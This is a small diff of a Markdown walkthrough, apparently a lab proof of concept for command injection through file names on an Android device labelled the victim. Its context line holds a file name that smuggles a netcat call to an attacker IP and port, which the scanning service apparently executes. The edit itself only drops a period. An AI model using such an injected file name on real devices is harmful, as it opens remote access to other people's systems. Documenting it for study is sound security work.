@@ -30,7 +30,7 @@ touch "zzz & nc 192.168.188.200 8002"
 - Android (Victim):
 ![victim ip](images/android%20devices%20ip.png)
 
-3. Toggle the button to run the service.
+3. Toggle the button to run the service
 ![Enabling services](images/toggle%20enable%20scanner.png)
 
 4. The service is do loop through all files in external storages.
